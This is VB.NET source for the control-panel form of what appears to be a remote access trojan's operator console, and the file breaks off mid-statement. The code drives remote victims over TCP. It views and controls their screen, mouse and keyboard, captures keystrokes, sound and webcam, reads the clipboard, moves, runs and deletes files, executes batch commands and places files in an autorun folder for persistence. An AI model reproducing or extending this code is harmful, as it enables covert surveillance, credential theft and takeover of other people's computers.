Imports System.Net.Sockets 'Importo il namespace System.Net.Sockets
Imports System.Text.UTF8Encoding 'Importo il namespace System.Text.UTF8Encoding per la codifica dei dati
Imports System.Net 'Importo il namespace System.Net per la gestione degli IP
Imports System.IO
Public Class frmControlPanel
    Public ISPC As Boolean
    Public clientschermo As TcpClient
    Public listenerschermo As TcpListener
    Public netstreamschermo As NetworkStream
    Public ISPCschermo As Boolean
    Public ispscher As Boolean
    Public FPAN2(frmMain.ReLimit) As frmScreen
    Public STFIR As Integer = 0
    Public STFIRar As Integer = 0
    Public listf As String
    Public STdr As Integer = 0
    Public STdrar As Integer = 0
    Public listdvs As String
    Public STp As Integer = 0
    Public STpar As Integer = 0
    Public listps As String
    Public STw As Integer = 0
    Public STwar As Integer = 0
    Public listws As String
    Public FoD As String
    Public clientdow As TcpClient
    Public listenerdow As TcpListener
    Public netstreamdow As NetworkStream
    Public ISCONNDOW As Boolean
    Public FilNas As String
    Public FilNas2 As String
    Public clientup As TcpClient
    Public listenerup As TcpListener
    Public netstreamup As NetworkStream
    Public ISCONNup As Boolean
    Public DirToUp As String
    Public FileToUp As String
    Public clientweb As TcpClient
    Public listenerweb As TcpListener
    Public netstreamweb As NetworkStream
    Public ISCONNweb As Boolean
    Public FPAN3(frmMain.ReLimit) As frmImmWeb
    Public clientkey As TcpClient
    Public listenerkey As TcpListener
    Public netstreamkey As NetworkStream
    Public ISPCkey As Boolean
    Public LoopK As Boolean
    Public textdel As String
    Public clientsuono As TcpClient
    Public listenersuono As TcpListener
    Public netstreamsuono As NetworkStream
    Public ISPCsuono As Boolean
    Public LoopS As Boolean
    Dim NumFS As Integer
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
  
    Private Sub frmControlPanel_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            FileClose(Me.lblClid.Text + 2)
            FileClose(Me.lblClid.Text + 4)
            FileClose(Me.lblClid.Text + 6)
            FileClose(Me.lblClid.Text + 8)
            FileClose(Me.lblClid.Text + 10)

            If Not listenerschermo Is Nothing Then
                Me.listenerschermo.Stop()
            End If

            If Not listenerdow Is Nothing Then
                Me.listenerdow.Stop()
            End If

            If Not listenerup Is Nothing Then
                Me.listenerup.Stop()
            End If

            If Not listenerweb Is Nothing Then
                Me.listenerweb.Stop()
            End If

            If Not listenerkey Is Nothing Then
                Me.listenerkey.Stop()
            End If

            If Not listenersuono Is Nothing Then
                Me.listenersuono.Stop()
            End If

            If Not FPAN2(Me.lblClid.Text - 1) Is Nothing Then
                FPAN2(Me.lblClid.Text - 1).LoopMouse = False
                FPAN2(Me.lblClid.Text - 1).LoopScreen = False
                FPAN2(Me.lblClid.Text - 1).LoopLeft = False
                FPAN2(Me.lblClid.Text - 1).LoopTwoClick = False
                FPAN2(Me.lblClid.Text - 1).LoopRight = False
                FPAN2(Me.lblClid.Text - 1).Close()
            End If

            If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                FPAN3(Me.lblClid.Text - 1).LoopWeb = False
                FPAN3(Me.lblClid.Text - 1).Close()

            End If
            Me.LoopK = False
            frmMain.ISFormOp(Me.lblClid.Text - 1) = False
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    
    Private Sub frmControlPanel_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            If Not frmMain.FInfo(frmMain.lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                frmMain.FInfo(frmMain.lstwIpReverse.SelectedIndices.Item(0)).Close()
            End If
            ISPC = True
            ISPCschermo = True
            Me.Text = "Control panel - " & frmMain.lstwIpReverse.SelectedItems.Item(0).Text
            'Aggiungo le colonne alla listview
            lstwProcessi.Columns.Add("Process name", 140)
            lstwProcessi.Columns.Add("ID", 50)
            lstwProcessi.Columns.Add("Main window name", 200)
            'lstwWindowsA.Columns.Add("Window name", 280)
            ''''''''''''''''''''''''''''''''''''''''''''''''''
            lstwFileFolderR.Columns.Add("File name", 140)
            lstwFileFolderR.Columns.Add("Type", 50)
            lstwFileFolderR.Columns.Add("Size (Kb)", 68)
            lstwFileFolderR.Columns.Add("Last modified", 200)
            lstwDowL.LargeImageList = frmMain.imlstIP
            lstwDowL.SmallImageList = frmMain.imlstIP
            lstwDowL.Columns.Add("File name", 100)
            lstwDowL.Columns.Add("Path", 100)
            lstwDowL.Columns.Add("Total kbytes", 70)
            'lstwDowL.Columns.Add("Received bytes", 100)
            lstwUpL.LargeImageList = frmMain.imlstIP
            lstwUpL.SmallImageList = frmMain.imlstIP
            lstwUpL.Columns.Add("File name", 100)
            lstwUpL.Columns.Add("Path", 100)
            lstwUpL.Columns.Add("Total kbytes", 70)
            'lstwUpL.Columns.Add("Sent bytes", 100)
            '''''''''''''''''''''''''''''''''''
            lstwClipboard.LargeImageList = frmMain.imlstIP
            lstwClipboard.SmallImageList = frmMain.imlstIP
            lstwClipboard.Columns.Add("Data", 200)
            lstwClipboard.Columns.Add("Time & {Status}", 200)
            '''''''''''''''''''''''''''''''''''
            lblExIp.Text = frmMain.LIP.ToString
            lblClid.Text = frmMain.lstwIpReverse.SelectedIndices.Item(0) + 1
            tmrDatiPann.Start()
            If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
                MkDir(Application.StartupPath & "\Computers")
                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                    End If

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                    End If
                End If
            Else
                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                    End If

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                    End If
                Else

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                    End If

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                    End If
                End If
            End If
            If Dir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\PortsSettings.ini") <> "" Then

                Dim fileReader90 As System.IO.StreamReader
                fileReader90 = _
                My.Computer.FileSystem.OpenTextFileReader(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\PortsSettings.ini")
                Dim Lettura2 As String
                Lettura2 = fileReader90.ReadToEnd
                fileReader90.Close()
                Try
                    nudS.Value = Split(Lettura2, vbCrLf)(0)
                    nudW.Value = Split(Lettura2, vbCrLf)(1)
                    NudK.Value = Split(Lettura2, vbCrLf)(2)
                    nudU.Value = Split(Lettura2, vbCrLf)(3)
                    nudD.Value = Split(Lettura2, vbCrLf)(4)
                    nudSD.Value = Split(Lettura2, vbCrLf)(5)
                Catch ex As Exception
                    nudS.Value = 6552
                    nudW.Value = 6552
                    NudK.Value = 6552
                    nudU.Value = 6552
                    nudD.Value = 6552
                    nudSD.Value = 6552
                    MsgBox("Error in setting saved ports!", MsgBoxStyle.Exclamation)
                End Try
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub tmrDatiPann_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiPann.Tick
        If ISPC = True Then
            If frmMain.client(lblClid.Text - 1).Available > 0 Then 'Verifico se arrivano dati dal client connesso
                Dim buffer3(frmMain.client(lblClid.Text - 1).Available - 1) As Byte 'Dichiaro un array di byte di dimensione pari ai dati arrivati
                frmMain.netstream(lblClid.Text - 1).Read(buffer3, 0, buffer3.Length) 'Leggo i dati

                Dim msgainfo2 As String = UTF8.GetString(buffer3) 'Ricodifico i dati in string e li metto in una variabile



                If InStr(msgainfo2, "|<|>|") Then
                    STpar = STpar + buffer3.Length
                    lstwProcessi.SmallImageList = frmMain.imlstIP
                    listps = listps & msgainfo2
                    msgainfo2 = ""
                    If STpar = STp Then
                        txtProID.Text = listps
                        listf = ""
                        STFIRar = 0
                        STFIR = 0
                        STdrar = 0
                        STdr = 0
                        listdvs = ""
                        STp = 0
                        STpar = 0
                        listps = ""
                        msgainfo2 = ""
                    End If
                End If

                'If InStr(msgainfo2, "<{WinEcco>") Then
                'lstwWindowsA.SmallImageList = frmMain.imlstIP
                'txtFina.Text = Replace(msgainfo2, "<{WinEcco>", "")
                ' msgainfo2 = ""
                'End If


                If InStr(msgainfo2, "<SchConness>") Then
                    msgainfo2 = ""
                    tmrPannSchermo.Stop()
                    listenerschermo.Stop()
                    picScreen.BackColor = Color.Green
                End If

                If InStr(msgainfo2, "|\XYDESS|\") Then
                    msgainfo2 = Replace(msgainfo2, "|\XYDESS|\", "")
                    lblXN.Text = Split(msgainfo2, "(-)")(0)
                    lblYN.Text = Split(msgainfo2, "(-)")(1)
                    msgainfo2 = ""
                End If

                If InStr(msgainfo2, "0|\/|£=>") Then
                    Dim COUTBHO As String = Replace(msgainfo2, "0|\/|£=>", "")
                    msgainfo2 = ""
                    txtCMDOUT.Text = COUTBHO
                End If

                If InStr(msgainfo2, "<CorDamm>") Then
                    msgainfo2 = ""


                    If Not FPAN2(lblClid.Text - 1) Is Nothing Then

                        If FPAN2(lblClid.Text - 1).picImm.Enabled = True Then

                            If FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text = "" Then

                                If FPAN2(lblClid.Text - 1).LoopMouse = True Then
                                    If Not FPAN2(lblClid.Text - 1).LoopLeft = True Then
                                        If FPAN2(lblClid.Text - 1).LoopTenPLeft = False Then
                                            If FPAN2(lblClid.Text - 1).LoopRight = False Then
                                                Try
                                                    frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes(
                                                                                                          FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                                          FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "<CCMOU|>"), 0, UTF8.GetBytes(
                                                                                            FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                            FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "<CCMOU|>").Length) 'invio il comando il Client)

                                                Catch ex As Exception
                                                    ISPC = False
                                                End Try
                                            Else
                                                FPAN2(lblClid.Text - 1).LoopLeft = False
                                                Try
                                                    frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes(
                                                                                                          FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                                          FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "|^Rght^|"), 0, UTF8.GetBytes(
                                                                                            FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                            FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "|^Rght^|").Length) 'invio il comando il Client)
                                                    FPAN2(lblClid.Text - 1).LoopRight = False

                                                Catch ex As Exception
                                                    ISPC = False
                                                End Try
                                            End If

                                        Else

                                            Try
                                                FPAN2(lblClid.Text - 1).LoopTenPLeft = False
                                                frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes(
                                                                                                      FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                                      FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "<T|e :n/^"), 0, UTF8.GetBytes(
                                                                                        FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                        FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "<T|e :n/^").Length) 'invio il comando il Client)

                                            Catch ex As Exception
                                                ISPC = False
                                            End Try

                                        End If
                                    Else
                                        If FPAN2(lblClid.Text - 1).LoopTenPLeft = False Then
                                            If Not FPAN2(lblClid.Text - 1).LoopTwoClick = True Then
                                                FPAN2(lblClid.Text - 1).LoopRight = False
                                                Try
                                                    frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes(
                                                                                                          FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                                          FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "-|Clk|-"), 0, UTF8.GetBytes(
                                                                                            FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                            FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "-|Clk|-").Length) 'invio il comando il Client)
                                                Catch ex As Exception
                                                    ISPC = False
                                                End Try
                                                FPAN2(lblClid.Text - 1).LoopLeft = False

                                            Else
                                                FPAN2(lblClid.Text - 1).LoopRight = False
                                                Try
                                                    frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes(
                                                                                                          FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                                          FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "$DuoC$|"), 0, UTF8.GetBytes(
                                                                                            FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                            FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "$DuoC$|").Length) 'invio il comando il Client)
                                                Catch ex As Exception
                                                    ISPC = False
                                                End Try
                                                FPAN2(lblClid.Text - 1).LoopLeft = False
                                                FPAN2(lblClid.Text - 1).LoopTwoClick = False
                                            End If

                                        Else
                                            FPAN2(lblClid.Text - 1).LoopTenPLeft = False
                                            Try
                                                frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes(
                                                                                                      FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                                      FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "<T|e :n/^"), 0, UTF8.GetBytes(
                                                                                        FPAN2(lblClid.Text - 1).Xc / FPAN2(lblClid.Text - 1).picImm.Width & " , " &
                                                                                        FPAN2(lblClid.Text - 1).Xy / FPAN2(lblClid.Text - 1).picImm.Height & "<T|e :n/^").Length) 'invio il comando il Client)

                                            Catch ex As Exception
                                                ISPC = False
                                            End Try

                                        End If
                                    End If
                                End If

                            Else
                                FPAN2(lblClid.Text - 1).IsAttK = True
                                FPAN2(lblClid.Text - 1).LoopMouse = False
                                FPAN2(lblClid.Text - 1).LoopLeft = False
                                FPAN2(lblClid.Text - 1).LoopRight = False
                                FPAN2(lblClid.Text - 1).LoopTwoClick = False
                                FPAN2(lblClid.Text - 1).LoopTenPLeft = False
                                FPAN2(lblClid.Text - 1).picImm.Enabled = False
                                Try

                                    FPAN2(lblClid.Text - 1).IsAttK = False
                                    frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes("|#ã#|" &
                                                                                              Microsoft.VisualBasic.Left(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, 1)), 0, UTF8.GetBytes("|#ã#|" &
                                                                                                                                                                        Microsoft.VisualBasic.Left(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, 1)).Length) 'invio il comando il Client
                                    FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text = Replace(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, Microsoft.VisualBasic.Left(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, 1), "")

                                Catch ex As Exception
                                    FPAN2(lblClid.Text - 1).IsAttK = True
                                    frmMain.FPAN(Me.lblClid.Text - 1).ISPC = False
                                End Try

                            End If
                        Else
                            FPAN2(lblClid.Text - 1).LoopMouse = False
                            FPAN2(lblClid.Text - 1).LoopLeft = False
                            FPAN2(lblClid.Text - 1).LoopRight = False
                            FPAN2(lblClid.Text - 1).LoopTwoClick = False
                            FPAN2(lblClid.Text - 1).picImm.Enabled = False
                            FPAN2(lblClid.Text - 1).LoopTenPLeft = False
                            If Not FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text = "" Then
                                Try

                                    FPAN2(lblClid.Text - 1).IsAttK = False
                                    frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes("|#ã#|" &
                                                                                              Microsoft.VisualBasic.Left(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, 1)), 0, UTF8.GetBytes("|#ã#|" &
                                                                                                                                                                        Microsoft.VisualBasic.Left(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, 1)).Length) 'invio il comando il Client
                                    FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text = Replace(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, Microsoft.VisualBasic.Left(FPAN2(lblClid.Text - 1).ToolStriptxtScrii.Text, 1), "")

                                Catch ex As Exception
                                    FPAN2(lblClid.Text - 1).IsAttK = True
                                    frmMain.FPAN(Me.lblClid.Text - 1).ISPC = False
                                End Try
                            End If

                        End If

                    End If


                End If


                If InStr(msgainfo2, " +-+ ") Then

                    STdrar = STdrar + buffer3.Length

                    lstwFileFolderR.SmallImageList = frmMain.imlstIP
                    lstwFileFolderR.LargeImageList = frmMain.imlstIP
                    lstwFileFolderR.Items.Clear()
                    listdvs = listdvs & msgainfo2
                    If STdrar = STdr Then
                        For driv = 0 To UBound(Split(listdvs, " +-+ "))
                            lstwFileFolderR.Items.Add(Split(listdvs, " +-+ ")(driv), 3)
                            lstwFileFolderR.Items.Item(driv).SubItems.Add("Driver")
                        Next driv
                        lstwFileFolderR.Items.Item(lstwFileFolderR.Items.Count - 1).Remove()
                        listf = ""
                        STFIRar = 0
                        STFIR = 0
                        STdrar = 0
                        STdr = 0
                        listdvs = ""
                        STp = 0
                        STpar = 0
                        listps = ""

                    End If
                    msgainfo2 = ""
                End If

                If InStr(msgainfo2, " <> ") Then
                    STFIRar = STFIRar + buffer3.Length
                    listf = listf & msgainfo2

                    If STFIRar = STFIR Then
                        lstwFileFolderR.Items.Clear()
                        txtFeD.Text = listf
                        listf = ""
                        STFIRar = 0
                        STFIR = 0
                        STdrar = 0
                        STdr = 0
                        listdvs = ""
                        STp = 0
                        STpar = 0
                        listps = ""
                    End If

                    msgainfo2 = ""
                End If

                If InStr(msgainfo2, "FileErr}") Then
                    listf = ""
                    STFIRar = 0
                    STFIR = 0
                    STdrar = 0
                    STdr = 0
                    listdvs = ""
                    STp = 0
                    STpar = 0
                    listps = ""
                    msgainfo2 = ""
                    txtPath.Text = ""
                    lstwFileFolderR.Items.Clear()
                    MsgBox("This path is not available", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "FiOk─┬}") Then
                    listf = ""
                    STFIRar = 0
                    STFIR = 0
                    STdrar = 0
                    STdr = 0
                    listdvs = ""
                    STp = 0
                    STpar = 0
                    listps = ""
                    STFIR = Replace(msgainfo2, "FiOk─┬}", "")
                    msgainfo2 = ""
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("{OkFil]"), 0, UTF8.GetBytes("{OkFil]").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                End If

                If InStr(msgainfo2, "<Ok°ÁDriver>") Then
                    listf = ""
                    STFIRar = 0
                    STFIR = 0
                    STdrar = 0
                    STdr = 0
                    listdvs = ""
                    STp = 0
                    STpar = 0
                    listps = ""
                    STdr = Replace(msgainfo2, "<Ok°ÁDriver>", "")
                    msgainfo2 = ""
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("#Okdar]"), 0, UTF8.GetBytes("#Okdar]").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                End If

                If InStr(msgainfo2, "/>Thpse>1") Then
                    listf = ""
                    STFIRar = 0
                    STFIR = 0
                    STdrar = 0
                    STdr = 0
                    listdvs = ""
                    STp = 0
                    STpar = 0
                    listps = ""
                    STp = Replace(msgainfo2, "/>Thpse>1", "")
                    msgainfo2 = ""
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("#PuProk]"), 0, UTF8.GetBytes("#PuProk]").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try
                End If

                If InStr(msgainfo2, "£é*_|Dr") Then
                    msgainfo2 = ""
                    MsgBox("The folder was not empty", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "ahdow|+^") Then
                    msgainfo2 = ""
                    tmrPannDow.Stop()
                    listenerdow.Stop()
                    picDow.BackColor = Color.Green
                End If

                If InStr(msgainfo2, "{+Errd}") Then
                    cmdStartDow.Enabled = True
                    Dim msgrep2 As String = Replace(msgainfo2, "{+Errd}", "")
                    msgainfo2 = ""
                    cmdStartDow.Enabled = True
                    MsgBox("Maybe the file that you would like to download is used by an other process" & vbCrLf & "File: " & msgrep2, MsgBoxStyle.Information)
                End If


                If InStr(msgainfo2, "ErrKill") Then
                    msgainfo2 = ""
                    MsgBox("Unable to delete the file, maybe it is used by an other process", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "PirFolAzz") Then
                    msgainfo2 = ""
                    MsgBox("Unable to delete the folder, maybe it is used by an other process", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "-NoUn-") Then
                    msgainfo2 = ""
                    MsgBox("You have written an invalid name for the file", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "{}DinAl{}") Then
                    msgainfo2 = ""
                    MsgBox("You have written an invalid name for the folder", MsgBoxStyle.Information)
                End If


                If InStr(msgainfo2, "ChiCu#°") Then
                    msgainfo2 = ""
                    MsgBox("Unable to start the file/folder", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "]@°°WallPe") Then
                    msgainfo2 = ""
                    MsgBox("Unable to set the wallpaper, the file is not correct!", MsgBoxStyle.Exclamation)
                End If

                If InStr(msgainfo2, "\Del£FtoD") Then
                    cmdStartDow.Enabled = True
                    Dim msgrep As String = Replace(msgainfo2, "\Del£FtoD", "")
                    msgainfo2 = ""
                    MsgBox("Unable to download " & vbCrLf & msgrep & vbCrLf & "It has been deleted!", MsgBoxStyle.Exclamation)
                End If

                If InStr(msgainfo2, "$||ErrP>") Then
                    msgainfo2 = ""
                    MsgBox("Unable to start the process", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "T!HAOK") Then
                    msgainfo2 = ""
                    txtLogmex.Text = txtLogmex.Text & "The remote user has clicked YES" & vbCrLf
                End If


                If InStr(msgainfo2, "T!HsnAbn") Then
                    msgainfo2 = ""
                    txtLogmex.Text = txtLogmex.Text & "The remote user has clicked NO" & vbCrLf
                End If

                If InStr(msgainfo2, "manna|Ca") Then
                    msgainfo2 = ""
                    txtLogmex.Text = txtLogmex.Text & "The remote user has clicked CANCEL" & vbCrLf
                End If

                If InStr(msgainfo2, "aru|Ret") Then
                    msgainfo2 = ""
                    txtLogmex.Text = txtLogmex.Text & "The remote user has clicked RETRY" & vbCrLf
                End If


                If InStr(msgainfo2, "^ì^||AtUp") Then
                    msgainfo2 = ""
                    tmrPannUp.Stop()
                    listenerup.Stop()
                    picUp.BackColor = Color.Green
                End If

                If InStr(msgainfo2, "{NOT\O") Then
                    netstreamup.Close()
                    DirToUp = ""
                    FileToUp = ""
                    lstwUpL.Items.Clear()
                    cmsStartUp.Enabled = True
                    MsgBox("Error in uploading file!", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "W|eb>Sp*^") Then
                    msgainfo2 = ""
                    tmrPannWeb.Stop()
                    listenerweb.Stop()
                    picWeb.BackColor = Color.Green
                End If


                If InStr(msgainfo2, "|D|{|S|") Then
                    combDri.Items.Clear()
                    Dim WeweDs() As String
                    WeweDs = Split(Replace(msgainfo2, "|D|{|S|", ""), vbCrLf)
                    msgainfo2 = ""
                    For ds = 0 To UBound(WeweDs) - 1
                        combDri.Items.Add(WeweDs(ds))
                    Next ds
                End If


                If InStr(msgainfo2, "ç/@ErW") Then
                    msgainfo2 = ""
                    MsgBox("Unable to open the remote webcam", MsgBoxStyle.Information)
                End If

                If InStr(msgainfo2, "é{°°#]>") Then
                    msgainfo2 = ""
                    tmrPannKey.Stop()
                    listenerkey.Stop()
                    picKey.BackColor = Color.Green
                End If

                If InStr(msgainfo2, "_<\2/") Then
                    Dim MexToEx As String = Replace(msgainfo2, Microsoft.VisualBasic.Right(msgainfo2, Len("_<\2/")), "")
                    msgainfo2 = ""
                    txtChatBox.Text = txtChatBox.Text & txtRName.Text & ": " & MexToEx & vbCrLf
                End If

                If InStr(msgainfo2, "|°CR}") Then
                    Dim MexToEx2 As String = Replace(msgainfo2, Microsoft.VisualBasic.Right(msgainfo2, Len("|°CR}")), "")
                    msgainfo2 = ""
                    lstwClipboard.Items.Add(MexToEx2, 9)
                    lstwClipboard.Items(lstwClipboard.Items.Count - 1).SubItems.Add(TimeOfDay & " " & "{READ}")
                End If

                If InStr(msgainfo2, ">|Su<°\") Then
                    msgainfo2 = ""
                    tmrPannSuono.Stop()
                    listenersuono.Stop()
                    picSou.BackColor = Color.Green
                End If


                If InStr(msgainfo2, "C|>>'MD") Then
                    msgainfo2 = ""
                    MsgBox("Error in starting batch command!", MsgBoxStyle.Critical)
                End If


                If InStr(msgainfo2, "|#ã#|") Then
                    msgainfo2 = ""
                    If Not FPAN2(Me.lblClid.Text - 1) Is Nothing Then


                        If FPAN2(Me.lblClid.Text - 1).IsAttK = False Then

                            If Not FPAN2(Me.lblClid.Text - 1).ToolStriptxtScrii.Text = "" Then

                                If FPAN2(Me.lblClid.Text - 1).picImm.Enabled = False Then

                                    Try
                                        FPAN2(Me.lblClid.Text - 1).IsAttK = False
                                        frmMain.netstream(Me.lblClid.Text - 1).Write(UTF8.GetBytes("|#ã#|" &
                                                                                                  Microsoft.VisualBasic.Left(FPAN2(Me.lblClid.Text - 1).ToolStriptxtScrii.Text, 1)), 0, UTF8.GetBytes("|#ã#|" &
                                                                                                                                                                            Microsoft.VisualBasic.Left(FPAN2(Me.lblClid.Text - 1).ToolStriptxtScrii.Text, 1)).Length) 'invio il comando il Client
                                        FPAN2(Me.lblClid.Text - 1).ToolStriptxtScrii.Text = Replace(FPAN2(Me.lblClid.Text - 1).ToolStriptxtScrii.Text, Microsoft.VisualBasic.Left(FPAN2(Me.lblClid.Text - 1).ToolStriptxtScrii.Text, 1), "")

                                    Catch ex As Exception
                                        ISPC = False
                                    End Try
                                Else
                                    FPAN2(Me.lblClid.Text - 1).IsAttK = True
                                End If

                            Else

                                FPAN2(Me.lblClid.Text - 1).IsAttK = True
                                FPAN2(Me.lblClid.Text - 1).picImm.Enabled = True
                            End If

                        End If


                    End If
                End If

                If InStr(msgainfo2, "|^%%i^$0") Then
                    Dim Soft As String = Replace(msgainfo2, "|^%%i^$0", "")
                    lstRunSo.Items.Add(Soft)
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("|^%%i^$0"), 0, UTF8.GetBytes("|^%%i^$0").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try
                End If


                If InStr(msgainfo2, "F|nSoft") Then
                    msgainfo2 = ""
                    cmdGetRunC.Enabled = True
                    tbcPannello.Enabled = True
                End If

                If InStr(msgainfo2, "@Rr0|^") Then
                    msgainfo2 = ""
                    cmdGetRunC.Enabled = True
                    tbcPannello.Enabled = True
                    MsgBox("Unable to read the software", MsgBoxStyle.Exclamation)
                End If

                If InStr(msgainfo2, "ç(°E^^r") Then
                    msgainfo2 = ""
                    MsgBox("Error in moving the file in Autorun folder!", MsgBoxStyle.Critical)
                End If



            End If


        Else

            tmrDatiPann.Stop()
            frmMain.cmdClo.Enabled = False

            If frmMain.NumSock = 1 Then
                frmMain.tmrDati.Stop()
                frmMain.tmrPen.Stop()
                frmMain.listener(frmMain.NumSock).Stop()
                frmMain.listener(frmMain.NumSock - 1).Stop()
                frmMain.client(frmMain.NumSock - 1).Close()
                frmMain.netstream(frmMain.NumSock - 1).Close()
                frmMain.listener(0).Stop()
                If lblClid.Text = 1 Then
                    frmMain.listener(lblClid.Text).Stop()
                    frmMain.listener(lblClid.Text - 1).Stop()
                    frmMain.client(lblClid.Text - 1).Close()
                    frmMain.netstream(lblClid.Text - 1).Close()
                End If
                frmMain.NumSock = 0
                frmMain.listener(0) = New TcpListener(IPAddress.Any, frmMain.nudPorta.Value) 'Assegno un istanza al primo server
